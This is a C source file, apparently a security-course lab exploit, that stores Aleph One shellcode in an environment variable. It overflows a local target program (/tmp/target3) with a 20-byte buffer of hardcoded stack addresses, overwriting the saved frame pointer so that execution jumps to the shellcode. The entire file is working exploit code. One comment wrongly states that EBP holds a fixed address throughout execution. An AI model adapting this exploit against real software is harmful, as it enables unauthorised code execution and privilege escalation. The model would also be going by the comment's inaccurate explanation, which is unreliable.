#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

static char env_addr[] = "\xb9\xff\xff\xbf";
static char ebp_addr[] = "\xf4\xfd\xff\xbf";

int main(void)
{
  char *args[3]; 
  char *env[2];
  
  // Set environment pointer
  int success = setenv("ALEPHCODE", shellcodeAlephOne, 1);
  char* env_ptr = getenv("ALEPHCODE");

  // EBP is the base pointer, which points to the bottom of the stack and is used to reference local variables by providing an offset 
  // to the register (note; EBP register has a static address, it is the only register that holds the same addresses through out the process execution).
  char buffer[20]; // We cannot overwrite EIP with 20 bytes, but we can overwrite EBP
  
  // Copy env address into 4x4 bytes of intvalues
  memcpy(buffer, env_addr, 4);
  memcpy(buffer+4, env_addr, 4);
  memcpy(buffer+8, env_addr, 4);
  memcpy(buffer+12, env_addr, 4);

  // Put address of one of intvalues into EBP
  memcpy(buffer+16, ebp_addr, 4);

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  
  env[0] = env_ptr;
  env[1] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


